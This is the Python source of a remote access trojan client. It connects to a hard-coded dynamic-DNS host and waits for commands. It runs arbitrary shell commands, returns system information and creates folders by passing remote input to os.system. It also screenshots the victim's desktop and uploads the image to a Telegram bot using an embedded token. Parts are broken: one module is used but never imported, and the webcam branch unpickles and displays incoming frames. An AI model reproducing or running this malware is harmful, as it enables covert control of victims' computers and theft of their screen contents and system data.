import socket
import sys
import time
import subprocess
import requests
import os
import struct
import pickle
import cv2
import base64
import numpy as np
host = 'dimagamera.ddns.net'
port = 81

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		break
	except:
		pass

while True:
	a = s.recv(1024)
	a = a.decode()
	if a == '/cmd':
		cmd = s.recv(1024)
		cmd = cmd.decode()
		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
		cmd_process = cmd_process.stdout + cmd_process.stderr
		s.send(cmd_process)

	elif a == '/screen':
		try:
			image = pyautogui.screenshot()
			image = cv2.cvtColor(np.array(image),
						cv2.COLOR_RGB2BGR)
			cv2.imwrite("image1.png", image)
			photo = open(r"image1.png", 'rb')
			files = {'document': photo}
			requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
			photo.close()
		except:
			pass

	elif a == '/mkdir':
		dir = s.recv(1024)
		dir = dir.decode()
		os.system('mkdir '+ str(dir))
	elif a == "/sysinfo":
		cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
		cmd_process = cmd_process.stdout + cmd_process.stderr
		s.send(cmd_process)
	elif a == "/webcam":
		data = b""
		payload_size = struct.calcsize("Q")
		while True:
			while len(data) < payload_size:
				packet = s.recv(4*1024) # 4K
				if not packet: break
				data+=packet
			packed_msg_size = data[:payload_size]
			data = data[payload_size:]
			msg_size = struct.unpack("Q",packed_msg_size)[0]
			
			while len(data) < msg_size:
				data += s.recv(4*1024)
			frame_data = data[:msg_size]
			data  = data[msg_size:]
			frame = pickle.loads(frame_data)
			cv2.imshow("RECEIVING VIDEO",frame)
			key = cv2.waitKey(1) & 0xFF
			if key  == ord('q'):
				break
		s.close()
